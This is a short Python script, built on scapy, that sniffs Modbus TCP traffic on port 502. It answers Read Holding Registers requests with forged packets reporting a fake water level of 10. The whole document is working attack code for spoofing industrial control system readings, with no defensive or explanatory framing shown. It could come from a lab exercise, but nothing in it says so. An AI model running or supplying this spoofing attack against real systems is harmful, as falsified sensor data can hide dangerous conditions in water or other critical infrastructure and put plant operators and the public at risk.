from scapy.all import *
from scapy.layers.inet import IP, TCP

def inject_fake_modbus(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 502:
        # Check if this is a Modbus Read Holding Registers request
        if pkt.haslayer(Raw) and pkt[Raw].load[7] == 0x03:  # Function code 0x03
            print("[*] Intercepted Modbus Read Request. Sending fake response...")

            # Extract transaction ID
            transaction_id = pkt[Raw].load[0:2]
            unit_id = pkt[Raw].load[6:7]

            # Craft fake Modbus response with water level = 10
            fake_data = transaction_id                   # Transaction ID
            fake_data += b'\x00\x00'                    # Protocol ID
            fake_data += b'\x00\x05'                    # Length
            fake_data += unit_id                        # Unit ID
            fake_data += b'\x03\x02\x00\x0A'            # Function=3, Byte Count=2, Data=0x000A (10)

            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            tcp = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq + len(pkt[Raw].load))
            response = ip / tcp / Raw(load=fake_data)

            send(response, verbose=0)
            print("[+] Fake Modbus response sent!")

# Enable sniffing
print("[*] Sniffing Modbus traffic and injecting fake water level...")
sniff(filter="tcp port 502", prn=inject_fake_modbus, store=0)
